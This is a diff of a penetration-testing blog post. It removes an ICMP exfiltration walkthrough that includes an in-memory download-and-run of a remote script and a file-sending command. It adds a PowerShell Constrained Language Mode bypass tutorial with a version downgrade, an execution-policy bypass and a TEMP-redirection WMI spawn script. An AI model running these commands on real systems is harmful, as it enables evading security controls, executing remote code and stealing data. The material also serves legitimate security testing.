@@ -5,91 +5,76 @@ categories: [techniques]
 tags: [windows, powershell, bypass]
 ---
 
-I recently had a situation during an engagement where i needed to demonstrate that data could be extracted from the organisation. I wanted to exfil data without going over the internet for security as well as for ease of use duing the engagement and speed.
-The VPN when connected, and as expected, didn't allow local access as all routing went through the established tunnel first. However when the tunnel was disconnected the firewall would block all TCP and UDP access but would allow ICMP traffic to local subnets.
-This then led me to look into ICMP tunneling. I found various ways of gaining a reverse shell however data exfiltration was more tricky - this is where Egress Assess comes in.   
-From the Github Page -> [https://github.com/FortyNorthSecurity/Egress-Assess](https://github.com/FortyNorthSecurity/Egress-Assess)
-"Egress-Assess is a tool used to test egress data detection capabilities."
-
-Egress-Assess has many use cases for confirming if data can be extracted out of the network including HTTP, SMB, ICMP and more. It also has PowerShell and Python implementations for both server and client. This is good for us as its unliekly that we normally have PowerShell access on Windows based systems.
-Another great feature is that the client doesnt require local administrative privileges to run.
-During testing it was also noted that as from the time of testing amsi didnt detect the client software as malicous or blocked the traffic as suspicous.
-
-The setup uses a tradtional client / Server design. The server does require local admin rights. My setup was a Debian 10 Box with a Windows 10 client.
-
-* Server (Debian) - 192.168.1.50
-* Client (Win 10) - 192.168.1.239
-
-
-Again from the Github Page, ICMP - The data is broken up into bytes and base64 encoded and sent over the wire in an ICMP Type 8 ECHO request. the data is placed inside the data field of the packet. The ECHO requests are continuously made to the EgressAsess Server which receives the ICMP request and gathers the data and decodes it.
-
-To start firstly, confirm that you can send and receive ICMP echo requests and Responses bi-directionally.
-
-Once confirmed, on the server, first clone down the repository.
+It is common during engagements to find that CLM (Constrained Language Mode) is configured on PowerShell as a SafeGuard or control against malicous activity.
+This is a common misconception as there are many ways that CLM can be bypassed.
+First check that CLM is in place by executing the following:
 
 ```
-git clone https://github.com/FortyNorthSecurity/Egress-Assess.git
+$ExecutionContext.SessionState.LanguageMode
 ```
 
-Next run the setup.sh from within the setup folder to install the necessasary files.
-Fix any errors if you get any before continuing.
+If you want to set the Session to CLM from Full for testing then run:
 
 ```
-./setup/.setup.sh
+$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
 ```
 
-Next start the server with the ICMP fetaures enabled:
+I will leave it to the reader to make sure that the default is using CLM and not Full mode if testing.
 
-```
-python Egress-Assess.py --server icmp --ip 192.168.1.50
+Or if you want to change the PowerShell version then simplay add the arguments as per above.
 
-```
-If the server has started correctly you should see the following:
-![img-description](/images/icmp-4.JPG)
-_ICMP Server Started & waiting for connections_
-
-Next you can either download the file onto the client, or run it in memory directly.
-
-```
-IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/FortyNorthSecurity/Egress-Assess/master/EgressAssess.ps1')
-```
-
-Next, you have two main options. You either user the built-in audit tools that will create dummy data to mimic sensitive information such as Social Security Numbers / Credit Cards, OR you can specify specfic custom files.
-
-I decided to create my own very simple file to understand how it was being tranferred. I did this by creating a file with some basic text inside on the client.
-
-```
-echo "Super Secret Info to Extract" > SuperSecretData.txt
-```
-
-We specify the File we want using the "-DataType" argument. ( You could also put "-DataType cc" for CreditCard.
-
-![img-description](/images/icmp-9.JPG)
-_Sending a file though an ICMP Packet_
+The most common route is to simply downgrade to version 2 by using the '--version 2' argument.
 
 
 ```
-Invoke-EgressAssess -client icmp -ip 192.168.1.50 -Datatype 'C:\Videos\SuperSecretData.txt' -Verbose
+powershell.exe -Version 2
 ```
 
-By using the "-Verbose" argument we can see that the connection was sucessful and that the client has indicated that the file was sucessfully sent.
+If you want to bypass the execution policy then append the following:
 
-On the server we can see a message confirming that the file has been recieved as expected.
+```
+powershell.exe -Version 2 -ExecutionPolicy bypass
+```
 
-![img-description](/images/icmp-10.JPG)
-_File Received on Server_
+Although this will likely work if PowerShell version 2 is installed alot of tools may not work to their full potential or simply not fit into your requirements using the legacy version.
 
-![img-description](/images/icmp-11.JPG)
-_File Received on Server_
+There are tools out there to help ofcourse, these are usually execuable files which will touch disk and may not be what you want to do.
 
-
-To confirm how this worked, we can see in Wireshark that the data is indeed base64 encoded.
-![img-description](/images/icmp-12.JPG)
-_Wireshark capture of base64 encoded data in an ICMP Packet_
-![img-description](/images/icmp-13.JPG)
-_Wireshark capture of base64 encoded data in an ICMP Packet_
-
-Therefore if we decode the base 64 we can see our message as expected and confirm how the data was transferred.
-![img-description](/images/icmp-14.JPG)
+The following method can be simply pasted into a PowerShell window and a new PowerShell session is spawned as either the current PowerShell Version, or if needed, you could change the version to any other (2,3,4,5,6,7)
 
 
+```
+$CurrTemp = $env:temp
+$CurrTmp = $env:tmp
+$TEMPBypassPath = "C:\windows\temp"
+$TMPBypassPath = "C:\windows\temp"
+
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
+
+Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe"
+sleep 5
+
+#Set it back
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
+```
+
+Or if you want to change the PowerShell version then simply add the arguments as per above.
+
+```
+$CurrTemp = $env:temp
+$CurrTmp = $env:tmp
+$TEMPBypassPath = "C:\windows\temp"
+$TMPBypassPath = "C:\windows\temp"
+
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
+
+Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe -Version 2 -ExecutionPolicy bypass"
+sleep 5
+
+#Set it back
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
+```
